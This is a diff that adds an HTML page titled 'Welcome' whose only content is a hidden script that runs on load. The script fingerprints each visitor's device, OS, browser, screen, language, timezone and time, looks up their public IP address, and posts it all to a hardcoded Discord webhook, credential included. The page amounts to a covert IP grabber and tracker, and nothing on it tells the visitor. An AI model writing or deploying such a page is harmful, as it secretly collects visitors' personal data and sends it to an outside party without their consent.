@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+</head>
+<body>
+
+<script>
+(async () => {
+  const webhook = "https://discord.com/api/webhooks/1569420361953443897/pJbG1Zhnx-MxdTWtvOzppho_UAfk3PMT2qwqNWQrDr55RqggcWK3jeyrBtcWelAGPQ-1";
+
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const lang = navigator.language;
+  const screen_res = `${screen.width}x${screen.height}`;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const time = new Date().toLocaleString();
+
+  let deviceType = "Desktop";
+  if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
+  else if (/Tablet|iPad/i.test(ua)) deviceType = "Tablet";
+
+  let os = "Unknown";
+  if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Mac OS X/i.test(ua)) os = "macOS";
+  else if (/Android/i.test(ua)) os = "Android";
+  else if (/iPhone|iPad/i.test(ua)) os = "iOS";
+  else if (/Linux/i.test(ua)) os = "Linux";
+
+  let browser = "Unknown";
+  if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+  else if (/Firefox/i.test(ua)) browser = "Firefox";
+  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+  else if (/Edg/i.test(ua)) browser = "Edge";
+  else if (/OPR|Opera/i.test(ua)) browser = "Opera";
+
+  let ip = "Unknown";
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    ip = data.ip;
+  } catch (_) {}
+
+  const payload = {
+    username: "Site Tracker",
+    embeds: [{
+      title: "New Visitor",
+      color: 0x5865F2,
+      fields: [
+        { name: "Device Type", value: deviceType, inline: true },
+        { name: "OS", value: os, inline: true },
+        { name: "Browser", value: browser, inline: true },
+        { name: "Screen", value: screen_res, inline: true },
+        { name: "Language", value: lang, inline: true },
+        { name: "Timezone", value: timezone, inline: true },
+        { name: "IP Address", value: ip, inline: true },
+        { name: "Platform", value: platform, inline: true },
+        { name: "Time", value: time, inline: false },
+        { name: "User Agent", value: `\`${ua.slice(0, 200)}\``, inline: false }
+      ],
+      footer: { text: "Visitor log" }
+    }]
+  };
+
+  await fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+})();
+</script>
+
+</body>
+</html>
